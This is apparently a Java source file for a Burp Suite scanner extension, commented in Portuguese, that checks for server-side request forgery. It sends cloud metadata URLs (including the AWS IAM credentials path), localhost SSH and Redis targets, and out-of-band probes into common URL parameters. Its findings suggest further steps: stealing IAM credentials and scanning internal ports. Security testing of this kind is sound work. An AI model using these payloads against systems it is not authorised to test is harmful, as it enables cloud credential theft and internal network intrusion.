package com.rx0.burp.scanner.checks;

import burp.api.montoya.MontoyaApi;
import burp.api.montoya.http.message.requests.HttpRequest;
import burp.api.montoya.http.message.responses.HttpResponse;
import com.rx0.burp.model.Finding;
import com.rx0.burp.model.Severity;
import com.rx0.burp.scanner.ScanContext;
import com.rx0.burp.scanner.VulnCheck;

import java.util.ArrayList;
import java.util.LinkedHashMap;
import java.util.List;
import java.util.Map;
import java.util.regex.Pattern;

/**
 * Testa parâmetros que costumam aceitar uma URL (webhook, callback, avatar,
 * import de arquivo por URL, etc) com alvos internos clássicos — especialmente
 * o endpoint de metadata de nuvem (AWS/GCP/Azure) — e procura por assinaturas
 * de resposta que confirmam que o SERVIDOR fez a requisição (SSRF).
 *
 * Isso é um probe baseado em conteúdo/erro — para confirmação definitiva em
 * ambientes sem metadata de nuvem, complemente com Burp Collaborator manualmente.
 *
 * Criado por Rx0 - @rodrigocoutinho91
 */
public class SsrfCheck implements VulnCheck {

    private static final String[] PARAM_NAMES = {
            "url", "uri", "link", "target", "callback", "webhook", "src", "image",
            "avatar", "file_url", "feed", "proxy", "fetch", "path", "dest"
    };

    // payload -> assinatura esperada na resposta se o servidor realmente buscou o recurso
    private static final Map<String, Pattern> ALVOS_INTERNOS = new LinkedHashMap<>();
    static {
        ALVOS_INTERNOS.put("http://169.254.169.254/latest/meta-data/",
                Pattern.compile("ami-id|instance-id|iam/security-credentials|local-hostname", Pattern.CASE_INSENSITIVE));
        ALVOS_INTERNOS.put("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
                Pattern.compile("AccessKeyId|SecretAccessKey|Token", Pattern.CASE_INSENSITIVE));
        ALVOS_INTERNOS.put("http://metadata.google.internal/computeMetadata/v1/",
                Pattern.compile("project-id|instance|computeMetadata", Pattern.CASE_INSENSITIVE));
        ALVOS_INTERNOS.put("http://127.0.0.1:22",
                Pattern.compile("SSH-2\\.0|SSH-1\\.99"));
        ALVOS_INTERNOS.put("http://localhost:6379",
                Pattern.compile("-ERR|\\+PONG|redis_version"));
    }

    @Override
    public String nome() {
        return "SSRF (parâmetros que aceitam URL + metadata de cloud)";
    }

    // Parâmetros usados pra teste com confirmação OOB (subconjunto, pra não gerar
    // probes demais — a detecção por conteúdo acima já cobre todos os PARAM_NAMES)
    private static final String[] PARAMS_PARA_OOB = {"url", "webhook", "callback", "src"};

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl) {
        return executar(api, baseUrl, (ScanContext) null);
    }

    @Override
    public List<Finding> executar(MontoyaApi api, String baseUrl, ScanContext ctx) {
        List<Finding> achados = new ArrayList<>();
        String base = baseUrl.endsWith("/") ? baseUrl.substring(0, baseUrl.length() - 1) : baseUrl;

        // --- Confirmação OOB via interactsh, quando disponível ---
        if (ctx != null && ctx.interactsh() != null && ctx.interactsh().isDisponivel()) {
            for (String param : PARAMS_PARA_OOB) {
                try {
                    String host = ctx.interactsh().criarProbe(
                            "SSRF confirmado via interação out-of-band no parâmetro '" + param + "'",
                            Severity.CRITICA,
                            base,
                            "O servidor alvo foi induzido a fazer uma requisição para um domínio único de teste através do " +
                                    "parâmetro '" + param + "', e essa requisição foi efetivamente recebida — confirmação " +
                                    "inequívoca de SSRF, mesmo sem metadata de cloud ou serviço local específico exposto.",
                            "Valide e restrinja destinos de requisições feitas pelo servidor a uma allowlist, bloqueie ranges " +
                                    "de IP internos/link-local e desabilite redirects automáticos nessas chamadas.",
                            "1) Use esse mesmo domínio único de teste (regenerável a cada scan) pra confirmar reprodutibilidade. " +
                                    "2) Troque o payload para apontar pra IPs/portas internas específicas da rede do alvo, " +
                                    "mantendo o mesmo tipo de canal OOB pra confirmar acesso a serviços internos.");
                    if (host != null) {
                        String payload = "http://" + host + "/rx0-ssrf-oob-probe";
                        String url = base + "/?" + param + "=" + java.net.URLEncoder.encode(payload, "UTF-8");
                        api.http().sendRequest(HttpRequest.httpRequestFromUrl(url));
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Erro ao disparar probe OOB de SSRF (param " + param + "): " + e.getMessage());
                }
            }
        }

        for (String param : PARAM_NAMES) {
            for (Map.Entry<String, Pattern> alvo : ALVOS_INTERNOS.entrySet()) {
                try {
                    String payload = alvo.getKey();
                    String url = base + "/?" + param + "=" + java.net.URLEncoder.encode(payload, "UTF-8");
                    HttpRequest req = HttpRequest.httpRequestFromUrl(url);
                    HttpResponse resp = api.http().sendRequest(req).response();
                    if (resp == null) continue;

                    String body = resp.bodyToString();
                    if (body == null) continue;

                    if (alvo.getValue().matcher(body).find()) {
                        achados.add(new Finding(
                                "Possível SSRF confirmado no parâmetro '" + param + "'",
                                Severity.CRITICA,
                                url,
                                "Ao enviar uma URL interna/de metadata de nuvem no parâmetro '" + param + "', a resposta contém " +
                                        "conteúdo que só existiria se o SERVIDOR tivesse feito a requisição por trás — ou seja, o backend " +
                                        "está buscando URLs fornecidas pelo usuário sem validação (SSRF).",
                                "Payload: " + payload + " | Assinatura encontrada na resposta: " + alvo.getValue().pattern(),
                                "Valide e restrinja destinos de requisições feitas pelo servidor a uma allowlist, bloqueie ranges de IP " +
                                        "internos/link-local (169.254.0.0/16, 127.0.0.0/8, 10.0.0.0/8 etc) e desabilite redirects automáticos nessas chamadas.",
                                "1) Reenvie no Repeater com o mesmo parâmetro '" + param + "' apontando pro Burp Collaborator pra confirmar " +
                                        "interação out-of-band. 2) Se for AWS, tente ler credenciais IAM completas em " +
                                        "/latest/meta-data/iam/security-credentials/<nome-da-role> (o nome vem da primeira resposta). " +
                                        "3) Teste varrer a rede interna trocando o host por outros IPs/portas (ex: 10.0.0.1:8080, 10.0.0.1:3306) " +
                                        "pra mapear serviços internos acessíveis. 4) Credenciais de cloud via SSRF costumam virar comprometimento total da conta."));
                    }
                } catch (Exception e) {
                    api.logging().logToError("[Rx0] Erro no check de SSRF (param " + param + "): " + e.getMessage());
                }
            }
        }
        return achados;
    }
}
